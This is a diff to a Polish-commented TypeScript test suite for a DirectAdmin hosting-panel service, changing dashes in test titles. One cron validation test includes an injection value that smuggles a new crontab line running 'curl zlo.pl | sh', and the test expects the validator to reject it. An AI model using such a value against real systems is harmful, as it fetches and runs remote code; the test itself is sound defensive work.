@@ -11,10 +11,10 @@ import { ZadanieCronDto } from '../subscriptions/dto/hosting-cron.dto.js';
  */
 const svc = new DirectAdminService({} as never, {} as never, {} as never, {} as never);
 const priv = svc as unknown as Record<string, (...a: unknown[]) => unknown>;
-const BEGIN = '# BEGIN VERRIS WEBTOOLS (zarządzane przez panel — nie edytuj ręcznie)';
+const BEGIN = '# BEGIN VERRIS WEBTOOLS (zarządzane przez panel – nie edytuj ręcznie)';
 const END = '# END VERRIS WEBTOOLS';
 
-describe('X-09 — odpowiedzi DirectAdmina', () => {
+describe('X-09 – odpowiedzi DirectAdmina', () => {
   it('parseKvPayload: błąd DA zamienia się w 400 z tekstem DA; tablice na list0..N', () => {
     expect(() => priv.parseKvPayload({ error: '1', text: 'Użytkownik istnieje' })).toThrow('Użytkownik istnieje');
     const p = priv.parseKvPayload({ error: '0', list: ['a', ' ', 'b'], nested: { x: 1 } }) as URLSearchParams;
@@ -42,7 +42,7 @@ describe('X-09 — odpowiedzi DirectAdmina', () => {
   });
 });
 
-describe('X-09 — blok .htaccess zarządzany przez panel', () => {
+describe('X-09 – blok .htaccess zarządzany przez panel', () => {
   it('wstawia blok przed regułami klienta i nie rusza ich przy ponownym zapisie', () => {
     const klienta = 'RewriteEngine On\nRewriteRule ^stara$ /nowa [R=301]';
     const raz = priv.spliceManagedBlock(klienta, 'Require all granted') as string;
@@ -71,7 +71,7 @@ describe('X-09 — blok .htaccess zarządzany przez panel', () => {
   });
 });
 
-describe('X-09 — zapis narzędzi WWW z danych klienta', () => {
+describe('X-09 – zapis narzędzi WWW z danych klienta', () => {
   function zapis(input: Record<string, unknown>, o: { listDir?: () => Promise<unknown> } = {}) {
     const writeFile = vi.fn(async () => undefined);
     const self = Object.assign(Object.create(DirectAdminService.prototype), {
@@ -116,7 +116,7 @@ describe('X-09 — zapis narzędzi WWW z danych klienta', () => {
   });
 });
 
-describe('X-09 — ochrona katalogu hasłem', () => {
+describe('X-09 – ochrona katalogu hasłem', () => {
   function chron(dir: string, realm?: string) {
     const writeFile = vi.fn(async () => undefined);
     const self = Object.assign(Object.create(DirectAdminService.prototype), {
@@ -148,11 +148,11 @@ describe('X-09 — ochrona katalogu hasłem', () => {
   });
 });
 
-describe('X-09 / L-03 — cron', () => {
+describe('X-09 / L-03 – cron', () => {
   const dto = (o: Record<string, string>) =>
     validateSync(plainToInstance(ZadanieCronDto, { minute: '0', hour: '3', dayOfMonth: '*', month: '*', dayOfWeek: '*', command: 'php cron.php', ...o }));
 
-  it('DTO: poprawny wpis przechodzi; nowa linia w komendzie lub polu i litery w harmonogramie — nie', () => {
+  it('DTO: poprawny wpis przechodzi; nowa linia w komendzie lub polu i litery w harmonogramie – nie', () => {
     expect(dto({})).toHaveLength(0);
     expect(dto({ minute: '*/5', dayOfWeek: '1-5' })).toHaveLength(0);
     expect(dto({ command: 'php a.php\n* * * * * curl zlo.pl | sh' }).length).toBeGreaterThan(0);
@@ -160,7 +160,7 @@ describe('X-09 / L-03 — cron', () => {
     expect(dto({ minute: '@reboot' }).length).toBeGreaterThan(0);
   });
 
-  it('edycja: najpierw nowy wpis, potem usunięcie starego; zły identyfikator — nic nie wysyłamy', async () => {
+  it('edycja: najpierw nowy wpis, potem usunięcie starego; zły identyfikator – nic nie wysyłamy', async () => {
     const kolejnosc: string[] = [];
     const self = Object.assign(Object.create(DirectAdminService.prototype), {
       createHostingCronJob: vi.fn(async () => { kolejnosc.push('create'); }),
